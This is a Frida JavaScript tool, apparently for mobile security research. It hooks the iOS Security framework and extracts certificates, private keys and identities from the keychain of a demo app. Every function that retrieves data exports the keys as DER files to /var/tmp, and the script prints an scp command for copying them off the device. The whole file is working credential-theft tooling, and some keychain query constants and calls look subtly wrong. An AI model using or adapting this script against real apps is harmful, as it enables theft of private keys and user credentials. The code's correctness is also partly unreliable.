/*
 * Frida Script: Extract Certificate and Private Key from Keychain Demo App
 * 
 * Usage:
 *   frida -U com.securityresearch.keychaindemo -l extract-keychain-demo.js
 * 
 * This script demonstrates how to:
 *   1. Hook SecItemCopyMatching to intercept keychain queries
 *   2. Extract certificates and private keys from the iOS Keychain
 *   3. Save extracted data to files for analysis
 */

if (ObjC.available) {
    console.log("[*] Keychain Demo Extraction Script");
    console.log("[*] ================================\n");

    // Find Security framework exports
    var modules = Process.enumerateModules();
    var securityModule = null;
    
    for (var i = 0; i < modules.length; i++) {
        if (modules[i].name === "Security") {
            securityModule = modules[i];
            break;
        }
    }

    if (!securityModule) {
        console.log("[-] Security framework not found!");
    } else {
        console.log("[+] Security framework at: " + securityModule.base);

        // Find function addresses
        var exports = securityModule.enumerateExports();
        var addresses = {};
        
        var functionsToFind = [
            "SecItemCopyMatching",
            "SecIdentityCopyCertificate", 
            "SecIdentityCopyPrivateKey",
            "SecCertificateCopyData",
            "SecKeyCopyExternalRepresentation"
        ];

        exports.forEach(function(exp) {
            if (functionsToFind.indexOf(exp.name) !== -1) {
                addresses[exp.name] = exp.address;
                console.log("[+] " + exp.name + " at " + exp.address);
            }
        });

        console.log("\n[*] Hooking SecItemCopyMatching...\n");

        // Hook SecItemCopyMatching
        var SecItemCopyMatching = new NativeFunction(
            addresses["SecItemCopyMatching"],
            'int',
            ['pointer', 'pointer']
        );

        Interceptor.attach(addresses["SecItemCopyMatching"], {
            onEnter: function(args) {
                var query = new ObjC.Object(args[0]);
                this.resultPtr = args[1];
                
                var queryStr = query.toString();
                
                // Check if this is a query for our demo app's keychain items
                if (queryStr.indexOf("keychaindemo") !== -1) {
                    console.log("\n[!] Keychain Query Detected:");
                    console.log("    " + queryStr.replace(/\n/g, "\n    "));
                }
            },
            onLeave: function(retval) {
                if (retval == 0) {
                    console.log("[+] Query succeeded!");
                }
            }
        });

        console.log("[+] Hook installed. Use the app to trigger keychain access.\n");
    }

    // Function to extract certificate
    function extractCertificate() {
        console.log("\n[*] Extracting Certificate...");
        
        var SecItemCopyMatchingAddr = addresses["SecItemCopyMatching"];
        var SecItemCopyMatching = new NativeFunction(SecItemCopyMatchingAddr, 'int', ['pointer', 'pointer']);
        
        var NSMutableDictionary = ObjC.classes.NSMutableDictionary;
        var query = NSMutableDictionary.alloc().init();
        
        query.setObject_forKey_("cert", "class");
        query.setObject_forKey_("com.keychaindemo.certificate", "labl");
        query.setObject_forKey_(ObjC.classes.NSNumber.alloc().initWithBool_(true), "r_Data");
        
        var resultPtr = Memory.alloc(Process.pointerSize);
        resultPtr.writePointer(ptr(0));
        
        var status = SecItemCopyMatching(query.handle, resultPtr);
        console.log("[+] Query status: " + status);
        
        if (status == 0) {
            var certData = new ObjC.Object(resultPtr.readPointer());
            console.log("[+] Certificate length: " + certData.length() + " bytes");
            
            var path = "/var/tmp/demo_cert.der";
            certData.writeToFile_atomically_(path, true);
            console.log("[+] Certificate saved to: " + path);
            
            return certData;
        } else {
            console.log("[-] Failed to extract certificate");
            return null;
        }
    }

    // Function to extract private key
    function extractPrivateKey() {
        console.log("\n[*] Extracting Private Key...");
        
        var SecItemCopyMatchingAddr = addresses["SecItemCopyMatching"];
        var SecItemCopyMatching = new NativeFunction(SecItemCopyMatchingAddr, 'int', ['pointer', 'pointer']);
        
        var NSMutableDictionary = ObjC.classes.NSMutableDictionary;
        var query = NSMutableDictionary.alloc().init();
        
        query.setObject_forKey_("keys", "class");
        query.setObject_forKey_("com.keychaindemo.privatekey", "labl");
        query.setObject_forKey_(ObjC.classes.NSNumber.alloc().initWithBool_(true), "r_Ref");
        
        var resultPtr = Memory.alloc(Process.pointerSize);
        resultPtr.writePointer(ptr(0));
        
        var status = SecItemCopyMatching(query.handle, resultPtr);
        console.log("[+] Query status: " + status);
        
        if (status == 0) {
            var keyRef = resultPtr.readPointer();
            console.log("[+] Got key reference: " + keyRef);
            
            // Export key data
            var SecKeyCopyExternalRepresentation = new NativeFunction(
                addresses["SecKeyCopyExternalRepresentation"],
                'pointer',
                ['pointer', 'pointer']
            );
            
            var errorPtr = Memory.alloc(Process.pointerSize);
            errorPtr.writePointer(ptr(0));
            
            var keyData = SecKeyCopyExternalRepresentation(keyRef, errorPtr);
            
            if (!keyData.isNull()) {
                var nsKeyData = new ObjC.Object(keyData);
                console.log("[+] Private key length: " + nsKeyData.length() + " bytes");
                
                var path = "/var/tmp/demo_key.der";
                nsKeyData.writeToFile_atomically_(path, true);
                console.log("[+] Private key saved to: " + path);
                
                return nsKeyData;
            } else {
                console.log("[-] Key is not extractable (possibly hardware-backed)");
                return null;
            }
        } else {
            console.log("[-] Failed to extract private key");
            return null;
        }
    }

    // Function to extract identity (cert + key pair)
    function extractIdentity() {
        console.log("\n[*] Extracting Identity...");
        
        var SecItemCopyMatchingAddr = addresses["SecItemCopyMatching"];
        var SecItemCopyMatching = new NativeFunction(SecItemCopyMatchingAddr, 'int', ['pointer', 'pointer']);
        
        var SecIdentityCopyCertificate = new NativeFunction(
            addresses["SecIdentityCopyCertificate"],
            'int',
            ['pointer', 'pointer']
        );
        
        var SecIdentityCopyPrivateKey = new NativeFunction(
            addresses["SecIdentityCopyPrivateKey"],
            'int',
            ['pointer', 'pointer']
        );
        
        var SecCertificateCopyData = new NativeFunction(
            addresses["SecCertificateCopyData"],
            'pointer',
            ['pointer']
        );
        
        var SecKeyCopyExternalRepresentation = new NativeFunction(
            addresses["SecKeyCopyExternalRepresentation"],
            'pointer',
            ['pointer', 'pointer']
        );
        
        var NSMutableDictionary = ObjC.classes.NSMutableDictionary;
        var query = NSMutableDictionary.alloc().init();
        
        query.setObject_forKey_("idnt", "class");
        query.setObject_forKey_("com.keychaindemo.certificate", "labl");
        query.setObject_forKey_(ObjC.classes.NSNumber.alloc().initWithBool_(true), "r_Ref");
        
        var resultPtr = Memory.alloc(Process.pointerSize);
        resultPtr.writePointer(ptr(0));
        
        var status = SecItemCopyMatching(query.handle, resultPtr);
        console.log("[+] Identity query status: " + status);
        
        if (status == 0) {
            var identityRef = resultPtr.readPointer();
            console.log("[+] Got identity reference: " + identityRef);
            
            // Extract certificate from identity
            var certRefPtr = Memory.alloc(Process.pointerSize);
            certRefPtr.writePointer(ptr(0));
            
            var certStatus = SecIdentityCopyCertificate(identityRef, certRefPtr);
            if (certStatus == 0) {
                var certRef = certRefPtr.readPointer();
                var certData = SecCertificateCopyData(certRef);
                
                if (!certData.isNull()) {
                    var nsCertData = new ObjC.Object(certData);
                    console.log("[+] Certificate from identity: " + nsCertData.length() + " bytes");
                    nsCertData.writeToFile_atomically_("/var/tmp/identity_cert.der", true);
                    console.log("[+] Saved to /var/tmp/identity_cert.der");
                }
            }
            
            // Extract private key from identity
            var keyRefPtr = Memory.alloc(Process.pointerSize);
            keyRefPtr.writePointer(ptr(0));
            
            var keyStatus = SecIdentityCopyPrivateKey(identityRef, keyRefPtr);
            if (keyStatus == 0) {
                var keyRef = keyRefPtr.readPointer();
                
                var errorPtr = Memory.alloc(Process.pointerSize);
                errorPtr.writePointer(ptr(0));
                
                var keyData = SecKeyCopyExternalRepresentation(keyRef, errorPtr);
                
                if (!keyData.isNull()) {
                    var nsKeyData = new ObjC.Object(keyData);
                    console.log("[+] Private key from identity: " + nsKeyData.length() + " bytes");
                    nsKeyData.writeToFile_atomically_("/var/tmp/identity_key.der", true);
                    console.log("[+] Saved to /var/tmp/identity_key.der");
                }
            }
            
            return true;
        } else {
            console.log("[-] No identity found");
            return false;
        }
    }

    // Function to list all certificates
    function listAllCertificates() {
        var SecItemCopyMatching = new NativeFunction(
            addresses["SecItemCopyMatching"],
            'int', ['pointer', 'pointer']
        );
        
        var query = ObjC.classes.NSMutableDictionary.alloc().init();
        query.setObject_forKey_("cert", "class");
        query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), "m_LwA");  // kSecMatchLimitAll
        query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), "r_Ref");  // kSecReturnRef
        
        console.log("[*] Querying ALL certificates...");
        console.log("[*] Query: " + query.toString());
        
        var resultPtr = Memory.alloc(Process.pointerSize);
        var status = SecItemCopyMatching(query, resultPtr);
        
        console.log("[*] Status: " + status);
        
        if (status == 0) {
            var result = new ObjC.Object(resultPtr.readPointer());
            console.log("[+] Found: " + result.toString());
        }
    }

    // Get access group
    function getCertificateAccessGroup() {
        var SecItemCopyMatching = new NativeFunction(
            addresses["SecItemCopyMatching"],
            'int', ['pointer', 'pointer']
        );
        
        var query = ObjC.classes.NSMutableDictionary.alloc().init();
        query.setObject_forKey_("cert", "class");
        //query.setObject_forKey_("com.keychaindemo.certificate", "labl");
        //query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), "r_Attributes");  // kSecReturnAttributes
        query.setObject_forKey_(ObjC.classes.NSNumber.alloc().initWithBool_(true), "r_Ref");
        query.setObject_forKey_(ObjC.classes.NSNumber.alloc().initWithBool_(true), "r_Attributes");
        query.setObject_forKey_("m_LimitAll", "m_Limit");
        
        var resultPtr = Memory.alloc(Process.pointerSize);
        var status = SecItemCopyMatching(query, resultPtr);
        
        if (status == 0) {
            var result = new ObjC.Object(resultPtr.readPointer());
            console.log("[+] Certificate attributes:");
            console.log(result.toString());
        } else {
            console.log("[-] Query failed: " + status);
        }
    }

    // Get key access group
    function getKeyAccessGroup() {
        var SecItemCopyMatching = new NativeFunction(
            addresses["SecItemCopyMatching"],
            'int', ['pointer', 'pointer']
        );
        
        var query = ObjC.classes.NSMutableDictionary.alloc().init();
        query.setObject_forKey_("keys", "class");
        query.setObject_forKey_("com.keychaindemo.privatekey", "labl");
        query.setObject_forKey_(ObjC.classes.NSNumber.numberWithBool_(true), "r_Attributes");
        
        var resultPtr = Memory.alloc(Process.pointerSize);
        var status = SecItemCopyMatching(query, resultPtr);
        
        if (status == 0) {
            var result = new ObjC.Object(resultPtr.readPointer());
            console.log("[+] Key attributes:");
            console.log(result.toString());
        } else {
            console.log("[-] Query failed: " + status);
        }
    }

    // Export functions for interactive use
    rpc.exports = {
        extractcert: extractCertificate,
        extractkey: extractPrivateKey,
        extractidentity: extractIdentity,
        listallcerts: listAllCertificates,
        getcertaccessgroup: getCertificateAccessGroup,
        getkeyaccessgroup: getKeyAccessGroup,
        extractall: function() {
            extractCertificate();
            extractPrivateKey();
            //extractIdentity();
            console.log("\n[*] Extraction complete!");
            console.log("[*] Files saved to /var/tmp/");
            console.log("[*] Pull with: scp root@<device>:/var/tmp/demo_*.der .");
        }
    };

    console.log("[*] Available commands (in Frida REPL):");
    console.log("    rpc.exports.extractcert()           - Extract certificate");
    console.log("    rpc.exports.extractkey()            - Extract private key");
    console.log("    rpc.exports.extractidentity()       - Extract identity (cert+key)");
    console.log("    rpc.exports.extractall()            - Extract everything");
    console.log("    rpc.exports.listallcerts()          - List all certificates");
    console.log("    rpc.exports.getcertaccessgroup()    - Get access group");
    console.log("    rpc.exports.getkeyaccessgroup()     - Get access group");
    console.log("");

} else {
    console.log("[-] Objective-C runtime not available!");
}
